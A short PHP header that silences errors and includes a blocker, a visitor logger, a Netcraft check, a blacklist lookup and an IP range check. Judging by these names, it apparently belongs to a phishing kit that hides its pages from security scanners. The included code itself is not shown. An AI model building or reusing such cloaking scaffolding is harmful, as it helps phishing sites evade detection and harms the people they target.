
<?php @error_reporting(0);
require "blocker.php";
require "FUNC/visitor_log.php";
require "FUNC/netcraft_check.php";
require "FUNC/blacklist_lookup.php";
require "FUNC/ip_range_check.php";
?>